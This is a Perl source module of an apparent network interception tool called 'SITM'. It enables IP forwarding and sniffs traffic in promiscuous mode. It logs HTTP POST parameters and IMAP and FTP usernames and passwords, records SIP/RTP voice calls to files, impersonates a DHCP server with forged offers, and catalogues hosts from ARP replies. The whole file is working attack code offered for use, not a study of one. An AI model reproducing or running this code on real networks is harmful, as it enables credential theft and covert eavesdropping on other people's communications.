my $DataOnPipe : shared = 0;
my %ResolvedHosts : shared = ();
my @LogEntry : shared = ();
my $Sniffer_Started = 0;
my $NetworkListener;
my $i = 1;
my $sip_intercepting = 0;
my @rtpport;

Net::MAC::Vendor::load_cache("Mac_Cache.txt");
sub Start_NetworkListener{
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    my $NetworkListener = threads->new(\&Start_NetworkListener_Thread);
    $NetworkListener->detach();
    $Sniffer_Started = 1;
}

sub GetSnifferStatus{
    return $Sniffer_Started;
}

sub Stop_NetworkListener{
    if ($NetworkListener){
        $NetworkListener->kill() if $NetworkListener->can('exit'); 
        $Sniffer_Started = 0;
        AddLogInfo("Sniffing stopped !\n");
    }
}

sub AddLogInfo{
    push(@LogEntry, $_[0]);
    $DataOnPipe = 1;
}

sub GetLog{
    return @LogEntry;
}

sub GetPipeStatus{
    return $DataOnPipe;
}

sub SetPipeStatus{
    $DataOnPipe = 0;
}

sub ClearPipe{
    @LogEntry = ();
}

sub AddResolvedHost{
    $ResolvedHosts{$_[0]} = $_[1];
}

sub GetResolvedHosts{
    return %ResolvedHosts;
}

sub Start_NetworkListener_Thread
{
        my @Settings = GetSettings();
        AddLogInfo("Started [MAC : ".get_interface_mac(GetSelectedInterface())."]\n");
        my $ipaddress = get_interface_address(GetSelectedInterface());
        my $npe = Net::Pcap::Easy->new(
            dev              => GetSelectedInterface(),
            timeout_in_ms    => 0,
            bytes_to_capture    => 1024,
            promiscuous      => 1,
            tcp_callback => sub {
                my ($npe, $ether, $ip, $tcp, $header ) = @_;
                if ($tcp->{dest_port} == "80" && 1 ~~ @Settings){
                    #print ("TCPDATAX : " .$tcp->{data}."\n");
                    if ($tcp->{data} =~ m/POST/)
                    {
                        #AddLogInfo("Got POST Data : " .$tcp->{data}."\n");
                        $datasrc = $tcp->{src_port};
                        print STDERR "POST DATA AT PORT : $datasrc\n";
                    }
                    elsif ($datasrc eq $tcp->{src_port})
                    {
                        #AddLogInfo("RETRANSMISSION TCP : " .$tcp->{data}." DONE \n");
                        #print STDERR "RETRANSMISSION TCP : ".$tcp->{data}."\n";
                        #AddLogInfo($tcp->{data}."\n");
                        my @tmp = split(/&/, $tcp->{data});         
                        foreach my $data (@tmp){
                            AddLogInfo("Got POST Parameter : $data.\n");
                        }
                        $datasrc = 0;
                    }
                     
                }
                elsif ($tcp->{dest_port} == 143 && 6 ~~ @Settings)
                {
                    my $login_packet =($ether->{data});
                    my $pack_hex = unpack("H*", $login_packet);
                    my $pack_type=index($pack_hex, "6c6f");
                        
                    if ($pack_type != -1)
                    {
                        my $packet_offset = substr $pack_hex, $pack_type; 
                        my $packet_final = pack("H*",$packet_offset);
                        my @logins= split (/ /, $packet_final); 
                        AddLogInfo("IMAP : ".$logins[0].":".$logins[1]." - Password: ".$logins[2]."\n");
                    }
                }
                elsif ($tcp->{dest_port} == 21 && 4 ~~ @Settings)
                {        
                    if ($tcp->{data})
                    {
                        my $data = $tcp->{data};
                        my @table = split(" ",$data);
                        if (exists($table[0]) && $table[0] eq 'USER' && exists($table[1]))
                        {
                            my $username = $table[1];
                        }
                        if(exists($table[0])&& $table[0]  eq 'PASS' && exists($table[1]))
                        {
                            AddLogInfo("FTP : ".$username." ".$table[1] ."\n");
                            #print "Le mot de passe est : " .$table[1] ."\n"; 
                        }
                    }
                }
            },

            udp_callback => sub {
                my ($npe, $ether, $ip, $udp, $header ) = @_;

                if ($udp->{dest_port} == 5060 && 2 ~~ @Settings)
                {
                    my $pkt = Net::SIP::Packet->new( $udp->{data} );
                    my $callid = $pkt->callid();
                    if ($pkt->cseq() =~ m/INVITE/)
                    {
                        AddLogInfo("SIP INVITE REQUEST FROM $callid!\n");
                        if ($sip_intercepting == 0)
                        {
                            open(SIPFDAUDIO, ">".strftime("%Y-%m-%d_%H:%M:%S_".$callid."_audio", localtime()));
                            open(SIPFDDATA, ">".strftime("%Y-%m-%d_%H:%M:%S_".$callid."_data", localtime()));
                            $sip_intercepting = 1;
                        }
                    }
                    if ($pkt->cseq() =~ m/BYE/)
                    {
                        AddLogInfo("SIP BYE REQUEST FROM $callid!\n");
                        if (SIPFDAUDIO)
                        {
                            close(SIPFDAUDIO);
                            close(SIPFDDATA);
                            @rtpport = ();
                            $sip_intercepting = 0;
                        }

                    }
                    if ($pkt->sdp_body){
                        my $sdp = $pkt->sdp_body;
                        my @media = $sdp->get_media;
                        foreach (@media) {
                            push(@rtpport,$_->{port});
                            AddLogInfo("SIP Audio Transmission detected at port : " .$_->{port}." \n");
                        } 
                    }
                
                }
                elsif ($udp->{dest_port} ~~ @rtpport && SIPFDAUDIO)
                {
                        my $rtppacket = new Net::RTP::Packet($udp->{data});
                        if ($rtppacket->payload_type < 24)
                        {
                            print SIPFDAUDIO $rtppacket->payload;
                        }
                        else
                        {
                            print SIPFDDATA $rtppacket->payload;
                        }
                }
                elsif ($udp->{dest_port} == 67 && 11 ~~ @Settings)
                {
                    AddLogInfo("[SITM] Got DHCP Request from $ether->{src_mac}!\n");
                    my $packet = Net::DHCP::Packet->new($udp->{data});
                    if ($packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE()) == 1)
                    {
                        ForgeDHCPServer($packet->xid(),"10.8.99.$i",get_interface_address(GetSelectedInterface()),DHCPOFFER(),$ether->{src_mac});
                    }
                    elsif ($packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE()) == 3)
                    {
                        ForgeDHCPServer($packet->xid(),"10.8.99.$i",get_interface_address(GetSelectedInterface()),DHCPACK(),$ether->{src_mac});
                        $i++;
                    }
                }
                
            },

            arp_callback => sub {
                my ($npe, $ether, $arp, $header) = @_;
                if ($arp->{opcode} == 2)
                {
            		my $ipsrc = IPFormat($arp->{spa});
                    if (!$ResolvedHosts{$ipsrc})
                    {
                		my $macsrc = MacFormat($arp->{sha});
                		my $hostname = ResolveHostName($ipsrc);
                        AddLogInfo("ARPWatcher : hw addr=$macsrc [ ".LookupMacVendor($macsrc)." ], " .
                        "resolved IP Address : $ipsrc [ ".$hostname." ]\n");
                        AddResolvedHost($ipsrc,$macsrc);
                    }
                }
                
            }
        );
        AddLogInfo("Network IP : " .$npe->network ."\n");
        AddLogInfo("Netmask : " .$npe->netmask ."\n");

        my $block = GetLocalNetInfo($npe->network, $npe->netmask);
        AddLogInfo("SITM Network Listener [".$block->first()."][".$block->last()."] started.");

        1 while $npe->loop;
    
}

sub GetLocalNetInfo {
    my $block = new Net::Netmask($_[0],$_[1]);
    return $block;
}

sub IPFormat
{
    return join ".", map { hex }($_[0] =~ /([[:xdigit:]]{2})/g)
}

sub MacFormat
{
    return join ":", ($_[0] =~ /([[:xdigit:]]{2})/g);
}

sub get_interface_address
{
    my ($iface) = @_;
    my $socket;
    socket($socket, PF_INET, SOCK_STREAM, (getprotobyname('tcp'))[2]) || die "unable to create a socket: $!\n";
    my $buf = pack('a256', $iface);
    if (ioctl($socket, SIOCGIFADDR(), $buf) && (my @address = unpack('x20 C4', $buf)))
    {
        return join('.', @address);
    }
    return undef;
}

sub get_interface_mac
{
    $if = $_[0];
    $localmac = `ifconfig $if | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`;
    return $localmac;
}

sub ResolveHostName {
    my $hostname = gethostbyaddr(inet_aton($_[0]), AF_INET);
    if ($hostname)
    {
    return $hostname;
    }
    else
    {
    return "Unknown";
    }
}

sub LookupMacVendor {
    my $vendor = Net::MAC::Vendor::lookup( $_[0] );
    if (@$vendor[0])
    {
        return @$vendor[0];
    }
    else
    {
        return "Unknown"
    }
}


return 1;